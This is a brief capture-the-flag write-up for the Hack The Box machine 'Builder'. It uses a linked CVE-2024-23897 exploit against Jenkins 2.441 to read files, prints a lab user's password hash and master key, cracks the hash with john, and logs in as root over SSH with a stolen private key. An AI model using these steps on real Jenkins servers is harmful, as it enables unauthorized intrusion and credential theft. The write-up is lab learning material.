# builder--rederence
Builder.htb solved

## Enumeration
ip: 10.10.11.10

On nmap scan we find port 8080 and 22 open

Website Location: port 8080
Address: http://10.10.11.10:8080/

User IDs: 1. jennifer
          2. anonymous

The website runs Jenkins 2.441

## Exploitation

The exploit:
https://github.com/godylockz/CVE-2024-23897

allows us to read various files on the computer. Reading the files mentioned in the above repo allows for exploitation and obtaining off password hash.

username: jennifer
password_hash: #jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a

Encryption master key: 3e3a8909d274de18b90e8d41789423c041dae2b1132514ac43b9714d62305dfba277b5bcec3a06339d9f111e902b64d063bf2eb322eb641edb846e6c019c95cbc38b849fcc2085d5f220c5b6e5468f97d0397502c6afc5a9a1375d346cd0adf08ebc377f48124b9422e91beb5596cdecd72886d7c7e3816a8c488e0270394347

Cracked the password hash by storing it in a file called crack.txt
command:
john crack.txt --wordlist=[path to rockyou.txt]
Obtained password: princess

Therefore,
username: jennifer
password: princess

By reading the credentials file, we get the SSH private key

We'll copy and paste this key into a file called key.id_rsa

Then we use `chmod 600 key.id_rsa`
This will allow us to connect using this key to ssh of the server

Use this command `ssh -i key.id_rsa root@10.10.11.10` to the connect to the ssh server. We are able to log in as root, which means the machine is over.
